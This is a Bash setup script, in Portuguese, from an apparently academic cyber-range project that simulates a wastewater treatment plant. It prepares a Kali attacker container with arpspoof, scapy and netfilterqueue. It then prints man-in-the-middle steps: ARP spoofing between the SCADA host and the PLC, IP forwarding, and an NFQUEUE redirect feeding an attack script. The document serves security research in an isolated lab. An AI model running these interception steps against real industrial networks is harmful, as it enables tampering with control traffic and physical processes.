#!/usr/bin/env bash
# =============================================================================
# Setup do Ambiente de Ataque / Limpeza - Docker + iptables
# =============================================================================
# Projeto: Simulador Virtual de ETE para Análise de Segurança Cibernética
# Autora:  Leticia dos Santos Matos (PIBIT/UNIFEI 2025)
# Fonte:   Testes Man-in-the-Middle (dez/2025) + Relatório Mitigação (2026)
#
# Descrição:
#   Script de preparação do container atacante (kali-rolling) para testes
#   de segurança no Cyber Range da ETE. Instala dependências e configura
#   o redirecionamento de pacotes.
#
# ATENÇÃO: Executar APENAS no container atacante em ambiente controlado.
# =============================================================================

set -euo pipefail

CONTAINER="labshock-pentest-1"

echo "=== [1/4] Conectando container à rede bridge (acesso à internet) ==="
docker network connect bridge "$CONTAINER"

echo "=== [2/4] Instalando dependências de compilação e Python ==="
docker exec -u 0 "$CONTAINER" apt-get update --fix-missing
docker exec -u 0 "$CONTAINER" apt-get install -y \
    build-essential \
    libnetfilter-queue-dev \
    libnfnetlink-dev \
    python3-dev \
    python3-pip \
    arpspoof \
    net-tools

echo "=== [3/4] Instalando bibliotecas Python ==="
docker exec -u 0 "$CONTAINER" pip3 install \
    netfilterqueue \
    scapy \
    --break-system-packages

echo "=== [4/4] Desconectando da internet e reiniciando container ==="
docker network disconnect bridge "$CONTAINER"
docker restart "$CONTAINER"

echo ""
echo "=== Container pronto para testes. ==="
echo ""
echo "PRÓXIMOS PASSOS (dentro do container atacante):"
echo "  Terminal 1:  arpspoof -i eth0 -t <IP_SCADA>  <IP_PLC>"
echo "  Terminal 2:  arpspoof -i eth0 -t <IP_PLC>    <IP_SCADA>"
echo "  Terminal 3:  echo 1 > /proc/sys/net/ipv4/ip_forward"
echo "               iptables -I FORWARD -j NFQUEUE --queue-num 0"
echo "               python3 <script_de_ataque>.py"
echo ""
echo "LIMPEZA (antes de cada novo teste):"
echo "  iptables -F"
echo "  iptables -X"
echo "  echo 1 > /proc/sys/net/ipv4/ip_forward"
